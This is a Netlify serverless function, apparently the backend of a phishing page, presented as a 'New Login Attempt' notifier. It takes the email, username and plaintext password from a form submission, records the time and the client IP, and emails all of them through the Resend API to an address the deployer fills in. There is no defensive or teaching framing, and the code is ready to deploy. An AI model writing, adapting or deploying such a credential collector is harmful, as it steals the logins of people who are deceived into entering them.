// netlify/functions/notify.js

const { Resend } = require("resend");
const resend = new Resend(process.env.RESEND_API_KEY);

exports.handler = async (event, context) => {
  // Only allow POST requests
  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: "Method Not Allowed" };
  }
  
  try {
    // Parse the incoming JSON body
    const data = JSON.parse(event.body);
    const { email, username, password } = data;

    // Capture additional details
    const timestamp = new Date().toISOString();
    // The IP address from the headers (if available)
    const ip = event.headers["x-forwarded-for"] || "Not Available";

    // Create the HTML content for the email
    const emailHtml = `
      <h3>New Login Attempt</h3>
      <ul>
        <li><strong>Email:</strong> ${email}</li>
        <li><strong>Username:</strong> ${username}</li>
        <li><strong>Password:</strong> ${password}</li>
        <li><strong>Timestamp:</strong> ${timestamp}</li>
        <li><strong>IP Address:</strong> ${ip}</li>
      </ul>
    `;

    // Send the email using Resend
    const emailResponse = await resend.sendEmail({
      from: "sender@example.com",         // Replace with your verified sender email
      to: "notification@example.com",       // Replace with your destination email address
      subject: "New Login Attempt Notification",
      html: emailHtml,
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ message: "Email sent", emailResponse }),
    };
  } catch (error) {
    console.error("Error sending email:", error);
    return { statusCode: 500, body: JSON.stringify({ error: error.message }) };
  }
};
